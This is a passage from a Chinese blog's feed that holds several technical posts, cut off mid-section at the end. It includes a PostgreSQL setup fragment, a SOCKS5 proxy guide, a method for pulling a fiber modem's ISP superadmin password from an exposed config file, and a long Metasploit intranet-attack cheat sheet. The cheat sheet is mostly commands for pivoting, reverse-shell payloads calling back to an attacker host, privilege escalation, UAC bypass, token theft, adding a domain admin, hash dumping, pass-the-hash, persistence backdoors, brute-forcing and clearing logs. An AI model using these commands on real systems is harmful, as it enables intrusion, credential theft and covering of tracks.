class="headerlink" title="设置开机自启动"></a>设置开机自启动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -sfv /usr/local/opt/postgresql/*.plist ~/Library/LaunchAgents</span><br><span class="line">launchctl load ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist</span><br></pre></td></tr></table></figure><h3 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h3><h4 id="FATAL-Ident-authentication-failed-for-user"><a href="#FATAL-Ident-authentication-failed-for-user" class="headerlink" title="FATAL: Ident authentication failed for user"></a>FATAL: Ident authentication failed for user</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is because by default PostgreSQL uses ‘ident’ authentication i.e it checks if the username exists on the system. You need to change authentication mode to ‘trust’ as we do not want to add a system user. Modify the settings in “pg_hba.conf” to use ‘trust’ authentication.</span><br></pre></td></tr></table></figure><p>请修改 <code>/usr/local/var/postgres/pg_hba.conf</code> 为：</p><p>安装 pgadmin，下载地址：<a href="http://www.pgadmin.org/download/macosx.php" target="_blank" rel="noopener">http://www.pgadmin.org/download/macosx.php</a></p><p>via：<a href="https://yq.aliyun.com/articles/25638" target="_blank" rel="noopener">https://yq.aliyun.com/articles/25638</a></p>]]></content>
    
    <summary type="html">
    
      在MacOS上安装 PostgreSQL 并正常配置使用。
    
    </summary>
    
    
      <category term="MacOS" scheme="http://lfoder.github.io/tags/MacOS/"/>
    
      <category term="PostgreSQL" scheme="http://lfoder.github.io/tags/PostgreSQL/"/>
    
      <category term="Database" scheme="http://lfoder.github.io/tags/Database/"/>
    
  </entry>
  
  <entry>
    <title>天翼光猫破解超级管理员账号密码</title>
    <link href="http://lfoder.github.io/2018/03/02/%E5%A4%A9%E7%BF%BC%E5%85%89%E7%8C%AB%E7%A0%B4%E8%A7%A3%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
    <id>http://lfoder.github.io/2018/03/02/天翼光猫破解超级管理员账号密码/</id>
    <published>2018-03-02T15:34:19.000Z</published>
    <updated>2018-03-02T15:41:38.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="获取密码的步骤"><a href="#获取密码的步骤" class="headerlink" title="获取密码的步骤"></a>获取密码的步骤</h3><ol><li><p>首先去光猫底部看看，你会发现一个普通用户的账号和密码，登录之。</p><p>​</p></li><li><p>假设你的光猫IP是 <code>192.168.1.1</code> 访问 <a href="http://192.168.1.1/backupsettings.conf" target="_blank" rel="noopener">http://192.168.1.1/backupsettings.conf</a> 这个连接下载配置文件。</p></li><li><p>重命名配置文件  <code>backupsettings.conf</code>  为 <code>backupsettings.conf.txt</code>  。</p></li><li><p>找到类似这样的地方，就是账号和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;X_CT-COM_TeleComAccount&gt;</span><br><span class="line">        &lt;Password&gt;telecomadmin88888888&lt;/Password&gt;</span><br><span class="line">&lt;/X_CT-COM_TeleComAccount&gt;</span><br></pre></td></tr></table></figure><p>其中通用账号是：<code>telecomadmin</code></p><p>密码则是：<code>telecomadmin88888888</code></p></li></ol>]]></content>
    
    <summary type="html">
    
      获取天翼上网光猫的超级管理员账号和密码
    
    </summary>
    
    
      <category term="路由器" scheme="http://lfoder.github.io/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
      <category term="光猫" scheme="http://lfoder.github.io/tags/%E5%85%89%E7%8C%AB/"/>
    
  </entry>
  
  <entry>
    <title>Linux搭建Socks5服务端</title>
    <link href="http://lfoder.github.io/2018/03/02/Linux%E6%90%AD%E5%BB%BASocks5%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    <id>http://lfoder.github.io/2018/03/02/Linux搭建Socks5服务端/</id>
    <published>2018-03-02T15:34:19.000Z</published>
    <updated>2018-05-13T15:25:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><ul><li>CentOS release 6.5   <code>64 bit</code></li></ul><h3 id="下载安装与编译"><a href="#下载安装与编译" class="headerlink" title="下载安装与编译"></a>下载安装与编译</h3><blockquote><p>安装依赖</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ automake make pam-devel openldap-devel cyrus-sasl-devel openssl-devel</span><br></pre></td></tr></table></figure><blockquote><p>安装最新版，可以从这里获取最新版 ==&gt; <a href="http://ss5.sourceforge.net/" target="_blank" rel="noopener">官方网站</a></p></blockquote><p>目前我的最新版是 <code>3.8.9-8</code>  ，使用 wget 下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://ncu.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz</span><br></pre></td></tr></table></figure><p>解压编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ./ss5-3.8.9-8.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ss5-3.8.9</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="配置与使用"><a href="#配置与使用" class="headerlink" title="配置与使用"></a>配置与使用</h3><p>####设置开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/init.d/ss5</span><br><span class="line">chkconfig --add ss5</span><br><span class="line">chkconfig --level 345 ss5 on</span><br></pre></td></tr></table></figure><h4 id="修改访问控制配置"><a href="#修改访问控制配置" class="headerlink" title="修改访问控制配置"></a>修改访问控制配置</h4><p>程序默认配置路径在 <code>/etc/opt/ss5</code>，修改配置来允许访问，编辑 <code>/etc/opt/ss5/ss5.conf</code>文件，找到如下位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               -</span><br></pre></td></tr></table></figure><p>上面的英文字段和下面的值一一对应，如果不需要认证，只用把auth前面的 <code>#</code> 号去掉即可。然后还需要修改一处：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure><p>此处与上同理，去掉 permit 前面的<code>#</code> 号即可。</p><h4 id="修改访问控制配置-带权限认证"><a href="#修改访问控制配置-带权限认证" class="headerlink" title="修改访问控制配置 (带权限认证)"></a>修改访问控制配置 (带权限认证)</h4><p><strong>这样配置的ss5是开放性的，任何能访问到你服务端口的人都能访问，如果你要设置账户授权访问，则可以限制使用者</strong></p><p>具体设置授权访问的方法如下，同样在  <code>/etc/opt/ss5/ss5.conf</code> 文件中找到上面两处，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               -</span><br></pre></td></tr></table></figure><p>看到后面又一个 <code>Authentication</code> 字段，下面对应了一个 <code>-</code> ，这里将横杠改成 <code>u</code> 即可，修改后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ///////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#       SHost           SPort           Authentication</span><br><span class="line">#</span><br><span class="line">auth    0.0.0.0/0               -               u</span><br></pre></td></tr></table></figure><p>然后还有第二处：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit -        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure><p>同样 <code>Auth</code> 下面对应的横杠 <code>-</code> 改成 <code>u</code> ，修改后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">#      Auth     SHost           SPort   DHost           DPort   Fixup   Group   Band    ExpDate</span><br><span class="line">#</span><br><span class="line">permit u        0.0.0.0/0       -       0.0.0.0/0       -       -       -       -       -</span><br></pre></td></tr></table></figure><p>这样就配置好了允许授权访问，然后你需要添加授权用户，此时操作 <code>/etc/opt/ss5/ss5.passwd</code>  文件，添加账户，一行一个，用空格隔开账号密码 <code>/etc/opt/ss5/ss5.conf</code> 内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin passw0rd123</span><br><span class="line">root pa55w0Rdl23</span><br></pre></td></tr></table></figure><p>这里添加了两个授权账户，可供连接ss5服务时授权认证。</p><h4 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h4><p><strong>ss5默认开启的代理端口时1080，这是一个常用的代理端口，经常会被一些黑客使用扫描器快速捕获到，我们可以通过修改默认端口的方式来隐藏ss5代理服务</strong></p><p>修改默认端口的方法如下，编辑 <code>vim /etc/sysconfig/ss5</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Add startup option here</span><br><span class="line">SS5_OPTS=&quot; -u root -b 0.0.0.0:9999&quot;</span><br></pre></td></tr></table></figure><p>去掉第二行前面的 <code>#</code> 井号主食 ，并将双引号中间的内容修改为上文中的配置，其中 <code>9999</code> 是修改后的代理端口，每次修改配置都需要重启ss5服务，使其生效。</p><h4 id="启动、关闭-ss5-服务"><a href="#启动、关闭-ss5-服务" class="headerlink" title="启动、关闭 ss5 服务"></a>启动、关闭 ss5 服务</h4><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 start</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 stop</span><br></pre></td></tr></table></figure><p>查看运行状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 status</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ss5 restart</span><br></pre></td></tr></table></figure><h4 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/<span class="built_in">log</span>/ss5/ss5.log</span><br></pre></td></tr></table></figure><p>完。</p>]]></content>
    
    <summary type="html">
    
      Linux上搭建Socks5服务器，提供代理服务
    
    </summary>
    
      <category term="Linux 笔记" scheme="http://lfoder.github.io/categories/Linux-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="linux" scheme="http://lfoder.github.io/tags/linux/"/>
    
      <category term="代理" scheme="http://lfoder.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="Socks5" scheme="http://lfoder.github.io/tags/Socks5/"/>
    
      <category term="隧道技术" scheme="http://lfoder.github.io/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>MetaSploit内网渗透全技巧</title>
    <link href="http://lfoder.github.io/2018/03/01/MetaSploit%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%85%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://lfoder.github.io/2018/03/01/MetaSploit内网渗透全技巧/</id>
    <published>2018-03-01T03:17:51.000Z</published>
    <updated>2018-05-13T15:26:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="技巧汇总"><a href="#技巧汇总" class="headerlink" title="技巧汇总"></a>技巧汇总</h2><h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>方法一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets //获取网段</span><br><span class="line">meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由</span><br><span class="line">meterpreter &gt; run autoroute -p //查看路由</span><br><span class="line">meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。</span><br><span class="line">meterpreter &gt; background //后台sessions</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run get_local_subnets #查看网段/子网 </span><br><span class="line">Local subnet: 192.168.33.0/255.255.255.0 </span><br><span class="line">meterpreter&gt; background #转入后台运行 </span><br><span class="line">msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 </span><br><span class="line">msf&gt; route print #查看添加的信息 </span><br><span class="line">msf&gt; use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻 </span><br><span class="line">msf&gt; set payload linux/x86/shell/reverse_tcp </span><br><span class="line">msf&gt; set LHOST 10.10.1.129 #此处为attacking 主机的外网IP </span><br><span class="line">msf&gt; set LPORT 8080 </span><br><span class="line">msf&gt; set RHOST 192.168.33.132 #内网目标主机 </span><br><span class="line">msf&gt; exploit </span><br><span class="line">也可以使用自动式添加路由模块： </span><br><span class="line">msf&gt; load auto_add_route </span><br><span class="line">msf&gt; exploit</span><br></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>自动化提权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法</span><br></pre></td></tr></table></figure><p>半自动提权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background //先后台运行会话</span><br><span class="line">[*] Backgrounding session 1…</span><br><span class="line">msf &gt; use post/windows/escalate/ms10_073_kbdlayout</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 1 //设置要使用的会话</span><br><span class="line">msf post(ms10_073_kbdlayout) &gt; exploit</span><br><span class="line">注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。</span><br><span class="line">或者直接：</span><br><span class="line">meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout</span><br></pre></td></tr></table></figure><h3 id="令牌窃取与模拟"><a href="#令牌窃取与模拟" class="headerlink" title="令牌窃取与模拟"></a>令牌窃取与模拟</h3><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 </p><ul><li>窃取令牌</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito //进入这个模块</span><br><span class="line">meterpreter &gt; list_tokens –u //查看存在的令牌</span><br><span class="line">meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠</span><br><span class="line"></span><br><span class="line">注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</span><br></pre></td></tr></table></figure><ul><li><p>令牌模拟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 </span><br><span class="line">meterpreter&gt; steal_token 380 </span><br><span class="line">有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 </span><br><span class="line">用token： </span><br><span class="line">meterpreter&gt; use incognito </span><br><span class="line">meterpreter&gt; list_tokens –u #列出可用token，假如找到域控token </span><br><span class="line">meterpreter&gt; impersonate_token SNEAKS.IN\ihazdomainadmin </span><br><span class="line">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 </span><br><span class="line">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set session 4</span><br><span class="line">msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</span><br></pre></td></tr></table></figure><h3 id="HashDump"><a href="#HashDump" class="headerlink" title="HashDump"></a>HashDump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好</span><br></pre></td></tr></table></figure><p>64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 <code>run post/windows/gather/hashdump</code> 来dump hash 成功率更高。<br>而且如果要使用shell 添加系统账户的话win7 下得先： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/escalate/bypassuac</span><br></pre></td></tr></table></figure><p>不然可能不会成功</p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><ul><li><p>服务启动后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler //新终端中监听</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; set RHOST 192.168.0.128</span><br><span class="line">msf &gt; run //获取到的会话是system权限</span><br></pre></td></tr></table></figure></li><li><p>启动项启动后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</span><br></pre></td></tr></table></figure><p>-X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code> 中的注册表键和 <code>C:\WINDOWS\TEMP\</code> 中的 VBScript 文件。</p><p>下次连接时： </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LPOST 443 </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ul><p>   会在以下位置和注册表以随机文件名写入文件等信息，如： </p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs </span><br><span class="line">C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe </span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</span><br></pre></td></tr></table></figure><p>  缺点：容易被杀毒软件杀 。</p><blockquote><p>弊端：这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程</p></blockquote><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><ul><li><p>端口扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set ports 21,22,25,443,445,1433,3306</span><br><span class="line">set threads 20</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>MSSQL开发利用</p><ol><li><p>对各个ip是否有mssql服务的探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping //测试MSSQL的存在和信息</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.2.1-255</span><br><span class="line">set threads 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>对扫描到的IP进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/mssql/mssql_login </span><br><span class="line">show options </span><br><span class="line">set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt </span><br><span class="line">set RHOSTS 192.168.1.130 </span><br><span class="line">set THREADS 10 </span><br><span class="line">set verbose false </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>sa权限对其利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use admin/mssql/mssql_exec</span><br><span class="line">set rhost 192.168.2.10</span><br><span class="line">set password sa</span><br><span class="line">set CMD cmd.exe /c echo hello</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol><li>使用MSSQL自带的 <code>xp_cmdshell</code> 添加账户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit/windows/mssql/mssql_payload </span><br><span class="line">show options </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">set LPORT 433 </span><br><span class="line">set RHOST 192.168.1.130 </span><br><span class="line">set PASSWORD password130 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>MySQL开放利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">待完善</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>爆破ssh模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set rhosts 7.7.7.20</span><br><span class="line">set username root</span><br><span class="line">set pass_file /root/pass.txt //加载字典，可以收集密码做字典</span><br><span class="line">set threads 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>通过nmap扫描基本漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap –script=vuln 受害靶机ip地址</span><br><span class="line">msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</span><br></pre></td></tr></table></figure></li></ul><p>###清除痕迹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</span><br></pre></td></tr></table></figure><h3 id="读取系统账号密码"><a href="#读取系统账号密码" class="headerlink" title="读取系统账号密码"></a>读取系统账号密码</h3><ul><li><p>加载mimikatz</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz //加载mimikatz模块</span><br><span class="line">meterpreter &gt; wdigest //需要system权限</span><br></pre></td></tr></table></figure></li><li><p>读取Hash并使用smb协议登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; use priv </span><br><span class="line">meterpreter&gt; run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure><p>当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 <code>pass-the-hash</code> 技术： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use windows/smb/psexec </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.1.111 </span><br><span class="line">set LPORT 443 </span><br><span class="line">set RHOST 192.168.1.130 </span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：<br>在目标机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker p@ssw0rd /add</span><br></pre></td></tr></table></figure><p>本地生成一个后门程序： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X &gt; payload.exe</span><br></pre></td></tr></table></figure><p>将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp </span><br><span class="line">LHOST=192.168.1.111 LPORT=443 </span><br><span class="line">use priv </span><br><span class="line">getsystem </span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>至此取得SYSTEM 权限</p></li></ul><h3 id="键盘记录"><a 